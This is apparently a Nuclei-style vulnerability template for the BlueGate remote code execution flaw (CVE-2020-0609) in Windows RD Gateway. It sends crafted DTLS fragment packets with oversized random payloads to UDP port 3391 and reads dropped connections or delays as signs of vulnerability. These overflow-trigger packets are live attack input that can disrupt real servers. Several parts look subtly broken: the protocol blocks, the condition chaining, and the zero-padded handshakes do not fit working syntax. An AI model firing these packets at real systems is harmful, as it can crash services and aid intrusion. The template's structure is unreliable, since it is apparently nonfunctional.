id: cve-2020-0609
info:
  name: Microsoft Windows Remote Desktop Gateway (RD Gateway) RCE (BlueGate)
  author: six
  severity: critical
  description: |
    Remote Code Execution via DTLS fragment overflow on UDP/3391 pre-auth, achieving system access.
  reference:
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0609
    - https://github.com/ly4k/BlueGate
    - https://nvd.nist.gov/vuln/detail/CVE-2020-0609
  classification:
    cvss-score: 9.8
    cve-id: CVE-2020-0609
    cwe-id: CWE-787
  metadata:
    vendor: microsoft
    product: windows-remote-desktop-gateway
    verified: true
    max-request: 8
    tags: cve,rce,windows,rdg,dtls,udp,bluegate

variables:
  session_id: '{{rand_base 32 "abcdef0123456789"}}'
  dtls_client_random: '{{rand_base 16 "hex"}}'
  exploit_payload_size: "{{rand_int 900 1000}}"

tcp:
  - inputs:
      - data: |
          {{hex_decode "16030100a1010000a003035f9c2e6e3e5f0d5f0c7e7d5f7f7e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"}}
    host:
      - "{{Hostname}}"
    port: 443
    read-size: 2048
    matchers-condition: and
    matchers:
      - type: binary
        binary:
          - "160301"
      - type: word
        words:
          - "Microsoft-IIS"
          - "RD Gateway"
          - "Terminal Services Gateway"
        part: body
        condition: or
      - type: dsl
        dsl:
          - "len(body) > 0"
    extractors:
      - type: regex
        name: server_version
        regex:
          - "Server: Microsoft-IIS/([\\d.]+)"
          - "Windows Server (\\d{4})"
        group: 1
        internal: true
    id: rdg_tls_confirmed

udp:
  - inputs:
      - data: |
          {{hex_decode "16feff00000000000000000000000000"}}{{session_id}}{{hex_decode "0100004c0000000000fc1603010000a3010000a003035f9c2e6e3e5f0d5f0c7e7d5f7f7e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"}}
    host:
      - "{{Hostname}}"
    port: 3391
    read-size: 2048
    matchers-condition: and
    matchers:
      - type: binary
        binary:
          - "16feff"
          - "16fefd"
        condition: or
      - type: binary
        binary:
          - "160100"
      - type: dsl
        dsl:
          - "len(body) > 20"
    extractors:
      - type: regex
        name: dtls_version
        regex:
          - "16(fe[fd]{2})"
        group: 1
        internal: true
      - type: regex
        name: server_random
        regex:
          - "([a-f0-9]{64})"
        group: 1
        internal: true
    id: rdg_dtls_confirmed

  - inputs:
      - data: |
          {{hex_decode "16feff00000000000000000000000000"}}{{session_id}}{{hex_decode "020000fc0000ffff00fc"}}{{rand_text_alphanumeric exploit_payload_size}}
    host:
      - "{{Hostname}}"
    port: 3391
    read-size: 2048
    read-timeout: 5s
    pre-condition:
      matchers:
        - type: dsl
          dsl:
            - "rdg_dtls_confirmed"
    matchers-condition: or
    matchers:
      - type: dsl
        name: connection_dropped
        dsl:
          - "len(body) == 0"
      - type: binary
        name: error_response
        binary:
          - "1503"
          - "0300"
        condition: or
      - type: dsl
        name: timing_anomaly
        dsl:
          - "duration > 4000"
        internal: true
    id: rdg_vuln_test_1

  - inputs:
      - data: |
          {{hex_decode "16feff00000000000000000000000000"}}{{session_id}}{{hex_decode "020000fc0000fffe00fc"}}{{rand_text_alphanumeric exploit_payload_size}}
    host:
      - "{{Hostname}}"
    port: 3391
    read-size: 2048
    read-timeout: 5s
    pre-condition:
      matchers:
        - type: dsl
          dsl:
            - "rdg_dtls_confirmed"
    matchers-condition: or
    matchers:
      - type: dsl
        name: connection_reset
        dsl:
          - "len(body) == 0"
      - type: binary
        name: dtls_alert
        binary:
          - "1503"
          - "0300"
        condition: or
      - type: dsl
        name: response_delay
        dsl:
          - "duration > 3000"
        internal: true
    id: rdg_vuln_test_2

  - inputs:
      - data: |
          {{hex_decode "16feff00000000000000000000000000"}}{{session_id}}{{hex_decode "020000fc0000000100fc"}}{{rand_text_alphanumeric exploit_payload_size}}
    host:
      - "{{Hostname}}"
    port: 3391
    read-size: 2048
    read-timeout: 5s
    pre-condition:
      matchers:
        - type: dsl
          dsl:
            - "rdg_dtls_confirmed"
    matchers-condition: or
    matchers:
      - type: dsl
        name: service_disruption
        dsl:
          - "len(body) == 0"
      - type: binary
        name: protocol_error
        binary:
          - "1503"
          - "0300"
        condition: or
      - type: dsl
        name: abnormal_response_time
        dsl:
          - "duration > 3000"
        internal: true
    id: rdg_vuln_test_3

http:
  - method: GET
    path:
      - "{{BaseURL}}/rdweb/"
      - "{{BaseURL}}/RDWeb/"
    headers:
      User-Agent: "{{UserAgent}}"
    matchers-condition: and
    matchers:
      - type: dsl
        name: vulnerability_confirmed
        dsl:
          - "rdg_tls_confirmed && rdg_dtls_confirmed && (rdg_vuln_test_1 || rdg_vuln_test_2 || rdg_vuln_test_3)"
      - type: word
        words:
          - "Remote Desktop"
          - "RD Web Access"
          - "Terminal Services"
        part: body
        condition: or
      - type: status
        status:
          - 200
          - 302
          - 401
        condition: or
      - type: word
        words:
          - "nginx"
          - "Apache"
          - "cloudflare"
        part: header
        negative: true
        condition: or
    extractors:
      - type: kval
        kval:
          - server_version
          - dtls_version
      - type: regex
        name: windows_version
        regex:
          - "Windows Server (\\d{4})"
        group: 1
      - type: dsl
        name: vulnerability_confidence
        dsl:
          - "(rdg_vuln_test_1 + rdg_vuln_test_2 + rdg_vuln_test_3)"
